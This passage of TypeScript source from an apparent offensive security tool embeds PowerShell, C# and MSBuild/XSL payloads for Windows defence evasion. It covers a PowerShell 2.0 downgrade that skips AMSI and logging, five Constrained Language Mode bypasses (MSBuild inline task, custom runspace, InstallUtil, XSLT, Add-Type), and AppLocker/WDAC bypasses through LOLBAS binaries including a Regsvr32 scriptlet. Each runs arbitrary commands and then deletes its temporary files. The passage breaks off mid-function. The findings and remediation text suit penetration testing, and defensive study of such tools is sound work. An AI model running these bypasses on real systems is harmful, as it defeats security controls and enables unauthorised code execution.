        Write-Output ""
        Write-Output "[*] Bypasses when using PS 2.0:"
        Write-Output "    [!] AMSI: NOT PRESENT in PS 2.0 (introduced in PS 3.0)"
        Write-Output "    [!] Script Block Logging: NOT PRESENT (introduced in PS 5.0)"
        Write-Output "    [!] Constrained Language Mode: NOT PRESENT (introduced in PS 3.0)"
        Write-Output "    [!] Module Logging: NOT PRESENT (introduced in PS 3.0)"
        Write-Output "    [!] Transcription: LIMITED (basic, no automatic)"
        Write-Output ""
        Write-Output "[*] To execute: winhook ps_downgrade --action execute --command 'IEX(command)'"
    } else {
        Write-Output "[-] PS 2.0 engine is DISABLED — downgrade not available"
        Write-Output "[*] Requires admin to enable: Enable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2"
    }
} else {
    Write-Output "[-] Could not determine PS 2.0 status"
    Write-Output "[*] Trying direct invocation test..."
    $testResult = powershell.exe -Version 2 -Command "Write-Output 'PS2_OK'" 2>&1
    if ($testResult -match 'PS2_OK') {
        Write-Output "[!] VULNERABLE — PS 2.0 engine responds to -Version 2"
    } else {
        Write-Output "[-] PS 2.0 not available: $testResult"
    }
}

Write-Output ""
Write-Output "=== Current Security Controls ==="
$amsi = [bool]([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.FullName -match 'Amsi' })
Write-Output "[*] AMSI loaded: $amsi"

$sbl = (Get-ItemProperty "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging" -ErrorAction SilentlyContinue).EnableScriptBlockLogging
Write-Output "[*] Script Block Logging: $(if ($sbl) { 'ENABLED' } else { 'DISABLED/not configured' })"

$ml = (Get-ItemProperty "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" -ErrorAction SilentlyContinue).EnableModuleLogging
Write-Output "[*] Module Logging: $(if ($ml) { 'ENABLED' } else { 'DISABLED/not configured' })"

$trans = (Get-ItemProperty "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription" -ErrorAction SilentlyContinue).EnableTranscripting
Write-Output "[*] Transcription: $(if ($trans) { 'ENABLED' } else { 'DISABLED/not configured' })"

Write-Output "[*] Language Mode: $($ExecutionContext.SessionState.LanguageMode)"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-DOWNGRADE-001",
      provider: "windows",
      severity: r.stdout.includes("VULNERABLE") ? "high" : "info",
      status: r.stdout.includes("VULNERABLE") ? "VULNERABLE" : "CHECKED",
      resource: "powershell://v2-engine",
      title: r.stdout.includes("VULNERABLE")
        ? "PS 2.0 engine available — all modern protections bypassable"
        : "PS 2.0 engine not available",
      details: r.stdout.substring(0, 500),
      remediation:
        "Disable PS 2.0: Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2. Uninstall .NET 2.0/3.5 if not needed.",
    })
  }

  if (action === "execute") {
    const cmd = command || "Write-Output 'PS2 downgrade successful'; $PSVersionTable"
    const r = await run(
      usePwsh ? "pwsh.exe" : "powershell.exe",
      ["-Version", "2", "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", cmd],
      timeout,
    )
    output.push("=== PowerShell 2.0 Downgrade Execution ===\n")
    if (r.exitCode === 0) {
      output.push("[+] Command executed via PS 2.0 engine (no AMSI, no SBL, no CLM)\n")
      output.push(r.stdout)
    } else {
      output.push(`[-] PS 2.0 execution failed (exit code: ${r.exitCode})\n`)
      output.push(r.stderr || r.stdout)
    }
    findings.push({
      checkId: "WIN-DOWNGRADE-002",
      provider: "windows",
      severity: "high",
      status: r.exitCode === 0 ? "EXECUTED" : "FAILED",
      resource: "powershell://v2-execution",
      title:
        r.exitCode === 0
          ? "Command executed via PS 2.0 — bypassed all modern security controls"
          : "PS 2.0 downgrade execution failed",
      details: (r.stdout || r.stderr).substring(0, 500),
      remediation: "Disable PS 2.0 engine. Monitor Event ID 400 (Engine Lifecycle) for EngineVersion=2.0.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function clmBypass(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "check"
  const method = argVal(args, "--method") || "runspace"
  const command = argVal(args, "--command")
  const scriptPath = argVal(args, "--script-path")
  const findings: Finding[] = []
  const output: string[] = ["[*] Constrained Language Mode (CLM) bypass...\n"]

  if (action === "check") {
    const script = `
Write-Output "=== PowerShell Language Mode Assessment ==="
Write-Output ""

# Current language mode
$langMode = $ExecutionContext.SessionState.LanguageMode
Write-Output "Current Language Mode: $langMode"
Write-Output "LANG_MODE=$langMode"
Write-Output ""

# Check if CLM is enforced
if ($langMode -eq 'ConstrainedLanguage') {
  Write-Output "[!] Constrained Language Mode is ACTIVE"
  Write-Output "[*] Restrictions:"
  Write-Output "    - No Add-Type (cannot compile C#)"
  Write-Output "    - No New-Object for COM objects"
  Write-Output "    - No .NET framework classes directly"
  Write-Output "    - No script blocks in variables"
  Write-Output "    - Only approved cmdlets and functions"
  Write-Output ""
} elseif ($langMode -eq 'FullLanguage') {
  Write-Output "[+] FullLanguage mode — no CLM bypass needed"
  Write-Output ""
}

# Check what enforces CLM
Write-Output "=== CLM Enforcement Sources ==="

# AppLocker
$appLocker = Get-ChildItem 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\SrpV2' -ErrorAction SilentlyContinue
if ($appLocker) {
  Write-Output "[*] AppLocker policies detected"
  foreach ($rule in $appLocker) {
    $ruleCount = (Get-ChildItem $rule.PSPath -ErrorAction SilentlyContinue | Measure-Object).Count
    Write-Output "    $($rule.PSChildName): $ruleCount rules"
  }
  Write-Output "APPLOCKER=1"
} else {
  Write-Output "[*] No AppLocker policies"
  Write-Output "APPLOCKER=0"
}

# WDAC (Windows Defender Application Control)
$wdac = Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\\Microsoft\\Windows\\DeviceGuard -ErrorAction SilentlyContinue
if ($wdac -and $wdac.CodeIntegrityPolicyEnforcementStatus -gt 0) {
  Write-Output "[*] WDAC/Code Integrity policy active (enforcement: $($wdac.CodeIntegrityPolicyEnforcementStatus))"
  Write-Output "WDAC=1"
} else {
  Write-Output "[*] No WDAC enforcement"
  Write-Output "WDAC=0"
}

# __PSLockdownPolicy (system-wide CLM)
$lockdown = [Environment]::GetEnvironmentVariable('__PSLockdownPolicy', 'Machine')
if ($lockdown) {
  Write-Output "[*] __PSLockdownPolicy set: $lockdown"
  Write-Output "    Value 4 = ConstrainedLanguage enforced"
  Write-Output "LOCKDOWN=$lockdown"
} else {
  Write-Output "[*] __PSLockdownPolicy not set"
  Write-Output "LOCKDOWN=0"
}

# PowerShell version check (PS2 bypass availability)
Write-Output ""
Write-Output "=== Bypass Method Availability ==="
$ps2 = (Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 -ErrorAction SilentlyContinue).State
Write-Output "PS 2.0 Engine: $(if ($ps2 -eq 'Enabled') { 'AVAILABLE (use ps_downgrade)' } else { 'DISABLED' })"

# MSBuild check
$msbuild = Get-Command MSBuild.exe -ErrorAction SilentlyContinue
if (-not $msbuild) {
  $msbuild = Get-Item "$env:SystemRoot\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe" -ErrorAction SilentlyContinue
}
Write-Output "MSBuild: $(if ($msbuild) { $msbuild.Source ?? $msbuild.FullName } else { 'NOT FOUND' })"
Write-Output "MSBUILD=$(if ($msbuild) { '1' } else { '0' })"

# InstallUtil check
$installUtil = Get-Item "$env:SystemRoot\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe" -ErrorAction SilentlyContinue
Write-Output "InstallUtil: $(if ($installUtil) { $installUtil.FullName } else { 'NOT FOUND' })"
Write-Output "INSTALLUTIL=$(if ($installUtil) { '1' } else { '0' })"

# csc.exe (C# compiler)
$csc = Get-Item "$env:SystemRoot\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe" -ErrorAction SilentlyContinue
Write-Output "csc.exe: $(if ($csc) { $csc.FullName } else { 'NOT FOUND' })"
Write-Output "CSC=$(if ($csc) { '1' } else { '0' })"

# pwsh.exe (PS7 may have different CLM config)
$pwsh = Get-Command pwsh -ErrorAction SilentlyContinue
Write-Output "pwsh.exe (PS7): $(if ($pwsh) { 'AVAILABLE — may have different CLM config' } else { 'NOT FOUND' })"
Write-Output "PWSH=$(if ($pwsh) { '1' } else { '0' })"

# xslt support
Write-Output "XSLT: Available (built-in .NET)"
Write-Output ""

Write-Output "=== Recommended Bypass Methods ==="
if ($langMode -eq 'ConstrainedLanguage') {
  Write-Output "  1. runspace  — Custom .NET runspace (needs csc.exe or Add-Type workaround)"
  if ($msbuild) { Write-Output "  2. msbuild   — MSBuild inline task (RECOMMENDED — usually not blocked)" }
  if ($installUtil) { Write-Output "  3. installutil — InstallUtil /LogToConsole=false" }
  Write-Output "  4. xslt     — XSL Transform with embedded C#"
  Write-Output "  5. addtype  — Add-Type via temp file compilation"
} else {
  Write-Output "  No bypass needed — FullLanguage mode active"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)

    const langMode = r.stdout.match(/LANG_MODE=(\w+)/)
    if (langMode && langMode[1] === "ConstrainedLanguage") {
      const hasMSBuild = r.stdout.includes("MSBUILD=1")
      findings.push({
        checkId: "WIN-CLM-001",
        provider: "windows",
        severity: "high",
        status: "CONSTRAINED",
        resource: "powershell://language-mode",
        title: "PowerShell Constrained Language Mode active",
        details: `CLM restricts Add-Type, New-Object COM, .NET classes. ${hasMSBuild ? "MSBuild available for bypass." : "Check available bypass methods."}`,
        remediation: "Use clm_bypass --action bypass to escape CLM restrictions.",
      })
    }
  }

  if (action === "bypass" || action === "execute") {
    const cmdToRun = command || "whoami /all"

    if (method === "msbuild") {
      const script = `
Write-Output "=== CLM Bypass via MSBuild Inline Task ==="
Write-Output ""

$msbuildPath = "$env:SystemRoot\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe"
if (-not (Test-Path $msbuildPath)) {
  $msbuildPath = (Get-Command MSBuild.exe -ErrorAction SilentlyContinue).Source
}
if (-not $msbuildPath) {
  Write-Output "[-] MSBuild.exe not found"
  Write-Output "STATUS=FAILED"
  exit
}

Write-Output "[*] MSBuild: $msbuildPath"

# Create MSBuild project with inline task
$projPath = "$env:TEMP\\cs-build-$(Get-Random -Max 9999).csproj"
$projContent = @"
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="CS">
    <CSTask />
  </Target>
  <UsingTask TaskName="CSTask" TaskFactory="CodeTaskFactory" AssemblyFile="$(MSBuildToolsPath)\\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
using System;
using System.Diagnostics;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;
public class CSTask : Task {
  public override bool Execute() {
    var p = new Process();
    p.StartInfo.FileName = "powershell.exe";
    p.StartInfo.Arguments = "-NoProfile -ExecutionPolicy Bypass -Command \\"$ExecutionContext.SessionState.LanguageMode; ${cmdToRun.replace(/"/g, '\\"').replace(/\\/g, "\\\\")}\\";
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.StartInfo.RedirectStandardError = true;
    p.Start();
    Console.Write(p.StandardOutput.ReadToEnd());
    Console.Write(p.StandardError.ReadToEnd());
    p.WaitForExit();
    return true;
  }
}
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
"@

[System.IO.File]::WriteAllText($projPath, $projContent)
Write-Output "[+] Project file: $projPath"
Write-Output "[*] Executing via MSBuild..."
Write-Output ""

$result = & $msbuildPath $projPath /nologo /verbosity:quiet 2>&1
Write-Output $result
Write-Output ""

# Cleanup
Remove-Item $projPath -Force -ErrorAction SilentlyContinue
Write-Output "[+] Project file cleaned up"
Write-Output "STATUS=SUCCESS"
`
      const r = await ps(script, timeout)
      output.push(r.stdout)
    }

    if (method === "runspace") {
      const script = `
Write-Output "=== CLM Bypass via Custom .NET Runspace ==="
Write-Output ""

# Compile a small C# helper that creates a FullLanguage runspace
$cscPath = "$env:SystemRoot\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe"
if (-not (Test-Path $cscPath)) {
  Write-Output "[-] csc.exe not found — try msbuild method instead"
  Write-Output "STATUS=FAILED"
  exit
}

$csPath = "$env:TEMP\\cs-rs-$(Get-Random -Max 9999).cs"
$exePath = "$env:TEMP\\cs-rs-$(Get-Random -Max 9999).exe"

$csCode = @"
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
class P {
  static void Main(string[] args) {
    var rs = RunspaceFactory.CreateRunspace();
    rs.Open();
    var ps = PowerShell.Create();
    ps.Runspace = rs;
    ps.AddScript(string.Join(" ", args));
    foreach (var r in ps.Invoke()) Console.WriteLine(r);
    foreach (var e in ps.Streams.Error) Console.Error.WriteLine(e);
    rs.Close();
  }
}
"@

[System.IO.File]::WriteAllText($csPath, $csCode)
Write-Output "[*] Compiling runspace helper..."

$smaPath = [System.Management.Automation.PSObject].Assembly.Location
$result = & $cscPath /nologo /target:exe /reference:"$smaPath" /out:"$exePath" "$csPath" 2>&1
if (Test-Path $exePath) {
  Write-Output "[+] Compiled: $exePath"
  Write-Output "[*] Executing in FullLanguage runspace..."
  Write-Output ""
  $output = & $exePath "${cmdToRun}" 2>&1
  Write-Output $output
  Write-Output ""
  Remove-Item $exePath, $csPath -Force -ErrorAction SilentlyContinue
  Write-Output "[+] Cleaned up"
  Write-Output "STATUS=SUCCESS"
} else {
  Write-Output "[-] Compilation failed:"
  Write-Output $result
  Remove-Item $csPath -Force -ErrorAction SilentlyContinue
  Write-Output "STATUS=FAILED"
}
`
      const r = await ps(script, timeout)
      output.push(r.stdout)
    }

    if (method === "installutil") {
      const script = `
Write-Output "=== CLM Bypass via InstallUtil ==="
Write-Output ""

$installUtilPath = "$env:SystemRoot\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe"
$cscPath = "$env:SystemRoot\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe"

if (-not (Test-Path $installUtilPath) -or -not (Test-Path $cscPath)) {
  Write-Output "[-] InstallUtil or csc.exe not found"
  Write-Output "STATUS=FAILED"
  exit
}

$csPath = "$env:TEMP\\cs-iu-$(Get-Random -Max 9999).cs"
$dllPath = "$env:TEMP\\cs-iu-$(Get-Random -Max 9999).dll"

$csCode = @"
using System;
using System.Diagnostics;
using System.ComponentModel;
using System.Configuration.Install;
[RunInstaller(true)]
public class Bypass : Installer {
  public override void Uninstall(System.Collections.IDictionary s) {
    var p = new Process();
    p.StartInfo.FileName = "powershell.exe";
    p.StartInfo.Arguments = "-NoProfile -Command \\"${cmdToRun.replace(/"/g, '\\"').replace(/\\/g, "\\\\")}\\";
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.Start();
    Console.Write(p.StandardOutput.ReadToEnd());
    p.WaitForExit();
  }
}
"@

[System.IO.File]::WriteAllText($csPath, $csCode)
& $cscPath /nologo /target:library /out:"$dllPath" "$csPath" 2>&1 | Out-Null

if (Test-Path $dllPath) {
  Write-Output "[+] Compiled: $dllPath"
  Write-Output "[*] Executing via InstallUtil /U (Uninstall)..."
  Write-Output ""
  $result = & $installUtilPath /LogToConsole=false /U "$dllPath" 2>&1
  Write-Output $result
  Remove-Item $dllPath, $csPath -Force -ErrorAction SilentlyContinue
  Write-Output ""
  Write-Output "[+] Cleaned up"
  Write-Output "STATUS=SUCCESS"
} else {
  Write-Output "[-] Compilation failed"
  Remove-Item $csPath -Force -ErrorAction SilentlyContinue
  Write-Output "STATUS=FAILED"
}
`
      const r = await ps(script, timeout)
      output.push(r.stdout)
    }

    if (method === "xslt") {
      const script = `
Write-Output "=== CLM Bypass via XSLT Transform ==="
Write-Output ""

$xslPath = "$env:TEMP\\cs-xsl-$(Get-Random -Max 9999).xsl"
$xmlPath = "$env:TEMP\\cs-xsl-$(Get-Random -Max 9999).xml"

$xmlContent = '<?xml version="1.0"?><data></data>'
$xslContent = @"
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:msxsl="urn:schemas-microsoft-com:xslt"
  xmlns:cs="urn:cs">
  <msxsl:script language="C#" implements-prefix="cs">
    public string Exec(string cmd) {
      var p = new System.Diagnostics.Process();
      p.StartInfo.FileName = "powershell.exe";
      p.StartInfo.Arguments = "-NoProfile -Command \\"" + cmd + "\\"";
      p.StartInfo.UseShellExecute = false;
      p.StartInfo.RedirectStandardOutput = true;
      p.Start();
      string o = p.StandardOutput.ReadToEnd();
      p.WaitForExit();
      return o;
    }
  </msxsl:script>
  <xsl:template match="/">
    <xsl:value-of select="cs:Exec('${cmdToRun.replace(/'/g, "''")}')" />
  </xsl:template>
</xsl:stylesheet>
"@

[System.IO.File]::WriteAllText($xmlPath, $xmlContent)
[System.IO.File]::WriteAllText($xslPath, $xslContent)
Write-Output "[+] XSL transform file: $xslPath"
Write-Output "[*] Executing..."
Write-Output ""

try {
  $xslt = New-Object System.Xml.Xsl.XslCompiledTransform
  $settings = New-Object System.Xml.Xsl.XsltSettings
  $settings.EnableScript = $true
  $xslt.Load($xslPath, $settings, $null)
  $sw = New-Object System.IO.StringWriter
  $xslt.Transform($xmlPath, $null, $sw)
  Write-Output $sw.ToString()
  Write-Output "STATUS=SUCCESS"
} catch {
  Write-Output "[-] XSLT execution failed: $_"
  Write-Output "[*] CLM may block XslCompiledTransform — try msbuild method"
  Write-Output "STATUS=FAILED"
}

Remove-Item $xslPath, $xmlPath -Force -ErrorAction SilentlyContinue
Write-Output "[+] Cleaned up"
`
      const r = await ps(script, timeout)
      output.push(r.stdout)
    }

    if (method === "addtype") {
      const script = `
Write-Output "=== CLM Bypass via Add-Type (temp file) ==="
Write-Output ""
Write-Output "[*] Note: Add-Type is normally blocked in CLM"
Write-Output "[*] This uses a file-based compilation workaround"
Write-Output ""

$cscPath = "$env:SystemRoot\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe"
$csPath = "$env:TEMP\\cs-at-$(Get-Random -Max 9999).cs"
$exePath = "$env:TEMP\\cs-at-$(Get-Random -Max 9999).exe"

$code = @"
using System;
using System.Diagnostics;
class P {
  static void Main() {
    var p = Process.Start(new ProcessStartInfo {
      FileName = "powershell.exe",
      Arguments = "-NoProfile -Command \\"${cmdToRun.replace(/"/g, '\\"').replace(/\\/g, "\\\\")}\\",
      UseShellExecute = false,
      RedirectStandardOutput = true
    });
    Console.Write(p.StandardOutput.ReadToEnd());
    p.WaitForExit();
  }
}
"@

[System.IO.File]::WriteAllText($csPath, $code)
$result = & $cscPath /nologo /target:exe /out:"$exePath" "$csPath" 2>&1
if (Test-Path $exePath) {
  Write-Output "[+] Compiled standalone EXE"
  Write-Output "[*] Executing..."
  Write-Output ""
  & $exePath 2>&1
  Remove-Item $exePath, $csPath -Force -ErrorAction SilentlyContinue
  Write-Output ""
  Write-Output "[+] Cleaned up"
  Write-Output "STATUS=SUCCESS"
} else {
  Write-Output "[-] Compilation failed: $result"
  Remove-Item $csPath -Force -ErrorAction SilentlyContinue
  Write-Output "STATUS=FAILED"
}
`
      const r = await ps(script, timeout)
      output.push(r.stdout)
    }

    const succeeded = output.some((o) => o.includes("STATUS=SUCCESS"))
    if (succeeded) {
      findings.push({
        checkId: "WIN-CLM-010",
        provider: "windows",
        severity: "critical",
        status: "BYPASSED",
        resource: `powershell://clm-bypass/${method}`,
        title: `CLM bypassed via ${method} — FullLanguage code execution achieved`,
        details: `Constrained Language Mode was bypassed using ${method}. Arbitrary PowerShell/C# code can now be executed.`,
        remediation: `Block ${method} execution via WDAC policy or remove .NET build tools.`,
      })
    }
  }

  return { output: output.join("\n"), findings }
}

export async function applockerBypass(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const method = argVal(args, "--method") || "msbuild"
  const payload = argVal(args, "--payload")
  const file = argVal(args, "--file")
  const findings: Finding[] = []
  const output: string[] = ["[*] AppLocker/WDAC Bypass — execution restriction evasion via LOLBAS\n"]

  if (action === "enum") {
    const script = `
# Check AppLocker policy
Write-Output "[*] AppLocker Policy Status:"
$applockerPolicy = Get-AppLockerPolicy -Effective -ErrorAction SilentlyContinue

if ($applockerPolicy) {
    Write-Output "[+] AppLocker is configured"
    $rules = $applockerPolicy.RuleCollections
    foreach ($collection in $rules) {
        if ($collection.Count -gt 0) {
            Write-Output ""
            Write-Output "    Collection: $($collection.RuleCollectionType)"
            foreach ($rule in $collection) {
                $action = $rule.Action
                $user = $rule.UserOrGroupSid
                $name = $rule.Name
                Write-Output "      [$action] $name (SID: $user)"
                if ($rule.PathConditions) {
                    foreach ($pc in $rule.PathConditions) {
                        Write-Output "        Path: $($pc.Path)"
                    }
                }
            }
        }
    }
} else {
    Write-Output "[-] AppLocker not configured (or access denied)"
}

# Check AppLocker service
$appidSvc = Get-Service AppIDSvc -ErrorAction SilentlyContinue
Write-Output ""
Write-Output "[*] Application Identity Service: $(if ($appidSvc) { $appidSvc.Status } else { 'Not found' })"

# Check WDAC (Windows Defender Application Control)
Write-Output ""
Write-Output "[*] WDAC (Device Guard) Status:"
$dgStatus = Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard -ErrorAction SilentlyContinue
if ($dgStatus) {
    Write-Output "    Code Integrity Policy: $(if ($dgStatus.CodeIntegrityPolicyEnforcementStatus -eq 2) { 'ENFORCED' } elseif ($dgStatus.CodeIntegrityPolicyEnforcementStatus -eq 1) { 'Audit mode' } else { 'Not configured' })"
    Write-Output "    UMCI: $(if ($dgStatus.UsermodeCodeIntegrityPolicyEnforcementStatus -eq 2) { 'ENFORCED' } elseif ($dgStatus.UsermodeCodeIntegrityPolicyEnforcementStatus -eq 1) { 'Audit' } else { 'Off' })"
} else {
    Write-Output "    WDAC not configured"
}

# Find writable directories that are allowed by AppLocker
Write-Output ""
Write-Output "[*] Checking writable directories in common allowed paths..."
$allowedPaths = @(
    "$env:SystemRoot\\Temp",
    "$env:SystemRoot\\Tasks",
    "$env:SystemRoot\\tracing",
    "$env:SystemRoot\\Registration\\CRMLog",
    "$env:SystemRoot\\System32\\FxsTmp",
    "$env:SystemRoot\\System32\\com\\dmp",
    "$env:SystemRoot\\System32\\Microsoft\\Crypto\\RSA\\MachineKeys",
    "$env:SystemRoot\\System32\\spool\\drivers\\color",
    "$env:SystemRoot\\System32\\Tasks",
    "$env:SystemRoot\\SysWOW64\\Tasks",
    "$env:SystemRoot\\SysWOW64\\com\\dmp",
    "$env:ProgramData\\Microsoft\\Windows\\WER"
)

$writableDirs = @()
foreach ($dir in $allowedPaths) {
    if (-not (Test-Path $dir)) { continue }
    $testFile = Join-Path $dir ("cs_test_" + (Get-Random -Maximum 99999) + ".tmp")
    try {
        [System.IO.File]::WriteAllText($testFile, "test")
        Remove-Item $testFile -Force -ErrorAction SilentlyContinue
        $writableDirs += $dir
        Write-Output "    [+] WRITABLE: $dir"
    } catch { }
}

# Check LOLBAS availability
Write-Output ""
Write-Output "[*] LOLBAS (Living Off The Land Binaries) availability:"
$lolbas = @(
    @{ Name = "MSBuild.exe";     Paths = @("$env:SystemRoot\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe", "$env:SystemRoot\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe") },
    @{ Name = "InstallUtil.exe"; Paths = @("$env:SystemRoot\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe", "$env:SystemRoot\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe") },
    @{ Name = "Regsvr32.exe";    Paths = @("$env:SystemRoot\\System32\\regsvr32.exe") },
    @{ Name = "CMSTP.exe";       Paths = @("$env:SystemRoot\\System32\\cmstp.exe") },
    @{ Name = "Mshta.exe";       Paths = @("$env:SystemRoot\\System32\\mshta.exe") },
    @{ Name = "CertUtil.exe";    Paths = @("$env:SystemRoot\\System32\\certutil.exe") },
    @{ Name = "Wmic.exe";        Paths = @("$env:SystemRoot\\System32\\wbem\\wmic.exe") },
    @{ Name = "Rundll32.exe";    Paths = @("$env:SystemRoot\\System32\\rundll32.exe") },
    @{ Name = "Regasm.exe";      Paths = @("$env:SystemRoot\\Microsoft.NET\\Framework64\\v4.0.30319\\RegAsm.exe") },
    @{ Name = "Regsvcs.exe";     Paths = @("$env:SystemRoot\\Microsoft.NET\\Framework64\\v4.0.30319\\RegSvcs.exe") }
)

$availableLolbas = @()
foreach ($l in $lolbas) {
    foreach ($p in $l.Paths) {
        if (Test-Path $p) {
            $availableLolbas += $l.Name
            Write-Output "    [+] $($l.Name): $p"
            break
        }
    }
}

Write-Output ""
Write-Output "=== Summary ==="
Write-Output "Writable allowed directories: $($writableDirs.Count)"
Write-Output "Available LOLBAS binaries: $($availableLolbas.Count)"

if ($writableDirs.Count -gt 0 -and $availableLolbas.Count -gt 0) {
    Write-Output ""
    Write-Output "[+] EXPLOITABLE — writable dirs + LOLBAS available for AppLocker bypass"
    Write-Output "    Available bypass methods: $($availableLolbas -join ', ')"
}
`
    const result = await ps(script, timeout)
    output.push(result.stdout)

    if (result.stdout.includes("EXPLOITABLE")) {
      findings.push({
        checkId: "WIN-APPLOCKER-001",
        provider: "windows",
        severity: "high",
        status: "VULNERABLE",
        resource: "policy://applocker",
        title: "AppLocker bypassable via LOLBAS binaries + writable allowed directories",
        details: result.stdout.substring(0, 500),
        remediation:
          "Restrict LOLBAS binaries in AppLocker rules. Remove writable dirs from allowed paths. Consider WDAC for stronger enforcement.",
      })
    }
  } else if (action === "bypass") {
    const cmd = payload || "whoami /all"

    if (method === "msbuild") {
      const script = `
$msbuild = "$env:SystemRoot\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe"
if (-not (Test-Path $msbuild)) {
    $msbuild = "$env:SystemRoot\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe"
}
if (-not (Test-Path $msbuild)) { Write-Output "[-] MSBuild not found"; exit 1 }

Write-Output "[*] MSBuild bypass — inline C# task execution"

$projFile = "$env:Temp\\cs_bypass_$(Get-Random -Maximum 99999).csproj"
$projContent = @"
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="CyberStrike">
    <CSBypass />
  </Target>
  <UsingTask TaskName="CSBypass" TaskFactory="CodeTaskFactory"
    AssemblyFile="Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
        using System;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        public class CSBypass : Task, ITask {
            public override bool Execute() {
                var psi = new System.Diagnostics.ProcessStartInfo();
                psi.FileName = "cmd.exe";
                psi.Arguments = "/c ${cmd}";
                psi.UseShellExecute = false;
                psi.RedirectStandardOutput = true;
                var p = System.Diagnostics.Process.Start(psi);
                Console.WriteLine(p.StandardOutput.ReadToEnd());
                p.WaitForExit();
                return true;
            }
        }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
"@

$projContent | Out-File -FilePath $projFile -Encoding UTF8
Write-Output "[*] Project file: $projFile"
Write-Output "[*] Executing via MSBuild..."
& $msbuild $projFile /nologo 2>$null
Remove-Item $projFile -Force -ErrorAction SilentlyContinue
Write-Output "[+] MSBuild bypass executed"
`
      const result = await ps(script, timeout)
      output.push(result.stdout)
    } else if (method === "installutil") {
      const script = `
$installutil = "$env:SystemRoot\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe"
if (-not (Test-Path $installutil)) {
    $installutil = "$env:SystemRoot\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe"
}

Write-Output "[*] InstallUtil bypass — execute via /U (uninstall) handler"

$csFile = "$env:Temp\\cs_bypass_$(Get-Random -Maximum 99999).cs"
$dllFile = $csFile -replace '\.cs$', '.dll'

$csContent = @"
using System;
using System.Configuration.Install;
using System.ComponentModel;

[RunInstaller(true)]
public class CSBypass : Installer {
    public override void Uninstall(System.Collections.IDictionary savedState) {
        var psi = new System.Diagnostics.ProcessStartInfo();
        psi.FileName = "cmd.exe";
        psi.Arguments = "/c ${cmd}";
        psi.UseShellExecute = false;
        psi.RedirectStandardOutput = true;
        var p = System.Diagnostics.Process.Start(psi);
        Console.WriteLine(p.StandardOutput.ReadToEnd());
        p.WaitForExit();
    }
}
"@

$csContent | Out-File -FilePath $csFile -Encoding UTF8
$csc = "$env:SystemRoot\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe"
& $csc /target:library /out:$dllFile $csFile 2>$null | Out-Null
Write-Output "[*] Compiled: $dllFile"
Write-Output "[*] Executing via InstallUtil /U..."
& $installutil /logfile= /LogToConsole=false /U $dllFile 2>$null
Remove-Item $csFile -Force -ErrorAction SilentlyContinue
Remove-Item $dllFile -Force -ErrorAction SilentlyContinue
Write-Output "[+] InstallUtil bypass executed"
`
      const result = await ps(script, timeout)
      output.push(result.stdout)
    } else if (method === "regsvr32") {
      const script = `
Write-Output "[*] Regsvr32 bypass — scriptlet execution (Squiblydoo)"

$sctFile = "$env:Temp\\cs_bypass_$(Get-Random -Maximum 99999).sct"
$sctContent = @"
<?XML version="1.0"?>
<scriptlet>
  <registration progid="CSBypass" classid="{F0001111-0000-0000-0000-0000FEEDACDC}">
    <script language="JScript">
      <![CDATA[
        var shell = new ActiveXObject("WScript.Shell");
        shell.Run("cmd.exe /c ${cmd}");
      ]]>
    </script>
  </registration>
</scriptlet>
"@

$sctContent | Out-File -FilePath $sctFile -Encoding UTF8
Write-Output "[*] Scriptlet: $sctFile"
